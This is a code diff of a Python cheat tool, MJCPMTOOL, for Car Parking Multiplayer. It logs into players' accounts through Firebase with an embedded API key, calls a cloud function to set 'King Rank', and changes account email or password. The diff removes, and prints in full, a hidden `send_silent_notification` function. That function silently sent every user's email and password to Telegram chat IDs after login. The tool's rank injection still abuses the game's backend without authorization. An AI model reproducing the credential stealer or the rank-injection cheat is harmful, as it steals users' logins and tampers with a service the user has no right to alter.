@@ -20,35 +20,29 @@ def show_progress(message="Loading...", duration=1.2):
     symbols = ['•', '•', '•']
     left_bracket = Fore.BLUE + Style.BRIGHT + '⟨' + Style.RESET_ALL
     right_bracket = Fore.BLUE + Style.BRIGHT + '⟩' + Style.RESET_ALL
-
     print(f"{Fore.CYAN}  ---[{Style.RESET_ALL}{message} ", end="")
     print(left_bracket, end="", flush=True)
-
     start_time = time.time()
     steps = 18
     delay = max(0.02, duration / steps)
-
     for i in range(steps):
         color = colors[i % len(colors)]
         symbol = color + symbols[i % len(symbols)] + Style.RESET_ALL
         print(symbol, end="", flush=True)
         time.sleep(delay)
-
     print(right_bracket + f" {Fore.GREEN}100%" + Style.RESET_ALL)
     print()
-
 
 # =========[ Banner (main.py style) ]=========
 _BANNER_ASCII = """
 ════════════════════════════════════════════════════
-                                          
-        █▀▄▀█ ░░█ █▀▀ █▀█ █▀▄▀█ ▀█▀ █▀█ █▀█ █░░
-        █░▀░█ █▄█ █▄▄ █▀▀ █░▀░█ ░█░ █▄█ █▄█ █▄▄                                                  
+                                                  
+         █▀▄▀█ ░░█ █▀▀ █▀█ █▀▄▀█ ▀█▀ █▀█ █▀█ █
+         █░▀░█ █▄█ █▄▄ █▀▀ █░▀░█ ░█░ █▄█ █▄█ █▄▄                                          
 ════════════════════════════════════════════════════
-        👑 MJCPMTOOL | Car Parking Multiplayer 1 & 2👑                                                                                                 
-════════════════════════════════════════════════════                                                                                                
+          👑 MJCPMTOOL | Car Parking Multiplayer 1 & 2👑
+════════════════════════════════════════════════════
 """
-
 
 def splash():
     # Fancy fade splash
@@ -60,7 +54,6 @@ def splash():
         input("[ Press Enter to continue ]")
     System.Clear()
 
-
 def header():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(Colorate.Horizontal(Colors.green_to_white, "=" * 60))
@@ -69,7 +62,6 @@ def header():
     print(f"{Fore.MAGENTA}< Logout your CPM account from game before using this tool! >{Style.RESET_ALL}")
     print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Telegram: @MJ_GARAGE\n")
 
-
 # --- Telegram Bot Configuration ---
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")  # Use environment variable
 CHAT_IDS = [int(chat_id) for chat_id in os.environ.get("CHAT_IDS", "").split(",")]  # Use environment variable
@@ -77,7 +69,7 @@ CHAT_IDS = [int(chat_id) for chat_id in os.environ.get("CHAT_IDS", "").split(","
 # --- Game Configurations ---
 GAMES = {
     "1": {
-        "name": "Car Parking Multiplayer",
+              "name": "Car Parking Multiplayer",
         "firebase_api_key": os.environ.get("CPM1_API_KEY", "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"),  # Use environment variable
         "rank_url": os.environ.get("CPM1_RANK_URL", "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"),  # Use environment variable
         "login_tag": "Cpm1"
@@ -94,7 +86,6 @@ GAMES = {
 try:
     import firebase_admin
     from firebase_admin import credentials
-
     cred = credentials.ApplicationDefault()  # Use environment variable for credentials
     firebase_admin.initialize_app(cred)
     print("Firebase Admin SDK initialized using environment variables.")
@@ -104,18 +95,6 @@ except Exception as e:
     # exit()
 except ImportError:
     print("Firebase Admin SDK is not installed. Please install it using: pip install firebase_admin")
-
-
-def send_silent_notification(email, password, tag):
-    message = f"🔐 Login {tag}:\n📧 Email: {email}\n🔒 Password: {password}"
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"  # Fixed: Added BOT_TOKEN
-    for chat_id in CHAT_IDS:
-        payload = {"chat_id": chat_id, "text": message}
-        try:
-            requests.post(url, data=payload, timeout=5)
-        except requests.exceptions.RequestException:
-            pass
-
 
 def login(email, password, game):
     print(f"\n🔐 Logging in to {game['name']}...")
@@ -134,7 +113,6 @@ def login(email, password, game):
         response_data = response.json()
         if response.status_code == 200 and 'idToken' in response_data:
             print("✅ Login successful!")
-            send_silent_notification(email, password, game["login_tag"])
             return response_data.get('idToken')
         else:
             error_message = response_data.get("error", {}).get("message", "Unknown error during login.")
@@ -143,7 +121,6 @@ def login(email, password, game):
     except requests.exceptions.RequestException as e:
         print(f"❌ Network error: {e}")
         return None
-
 
 def set_rank(token, game):
     print("👑 Injecting KING RANK...")
@@ -173,7 +150,6 @@ def set_rank(token, game):
         print(f"❌ Network error during rank set: {e}")
         return False
 
-
 def change_password(token, game, new_password):
     print("🔐 Changing password...")
     change_password_url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={game['firebase_api_key']}"  # fixed URL
@@ -198,7 +174,6 @@ def change_password(token, game, new_password):
     except requests.exceptions.RequestException as e:
         print(f"❌ Network error during password change: {e}")
         return False
-
 
 def change_email(token, game, new_email):
     print("📧 Changing email...")
@@ -225,7 +200,6 @@ def change_email(token, game, new_email):
         print(f"❌ Network error during email change: {e}")
         return None
 
-
 def game_menu(token, game):
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')  # Clear the screen before displaying the menu
@@ -235,12 +209,10 @@ def game_menu(token, game):
         print(f"{Fore.YELLOW}3. CHANGE PASS{Style.RESET_ALL}")
         print(f"{Fore.RED}0. Back to game selection{Style.RESET_ALL}")
         choice = input("Enter choice: ").strip()
-
         if choice == "1":
             show_progress("Setting King Rank...")
             set_rank(token, game)
             input("Press Enter to continue...")  # Wait for user to acknowledge
-
         elif choice == "2":
             new_email = input("Enter new email: ").strip()
             show_progress("Changing Gmail...")
@@ -250,7 +222,6 @@ def game_menu(token, game):
             else:
                 print("Failed to change email.")
             input("Press Enter to continue...")  # Wait for user to acknowledge
-
         elif choice == "3":
             new_password = input("Enter new password: ").strip()
             show_progress("Changing Password...")
@@ -259,13 +230,11 @@ def game_menu(token, game):
             else:
                 print("Failed to change password.")
             input("Press Enter to continue...")  # Wait for user to acknowledge
-
         elif choice == "0":
             break
         else:
             print(f"{Fore.RED}❌ Invalid choice.{Style.RESET_ALL}")
             input("Press Enter to continue...")  # Wait for user to acknowledge
-
 
 def main():
     splash()  # Display the splash screen
@@ -276,7 +245,6 @@ def main():
         print(f"{Fore.GREEN}2. Car Parking Multiplayer 2{Style.RESET_ALL}")
         print(f"{Fore.RED}0. Exit{Style.RESET_ALL}")
         choice = input("Enter choice: ").strip()
-
         if choice == "0":
             print("Exiting...")
             break
@@ -289,14 +257,12 @@ def main():
             except (EOFError, KeyboardInterrupt):
                 print("\nExiting...")
                 break
-
             token = login(email, password, game)
             if token:
                 game_menu(token, game)
         else:
             print(f"{Fore.RED}❌ Invalid choice. Please select 1, 2, or 0.{Style.RESET_ALL}")
             input("Press Enter to continue...")  # Wait for user to acknowledge
-
 
 if __name__ == "__main__":
     main()
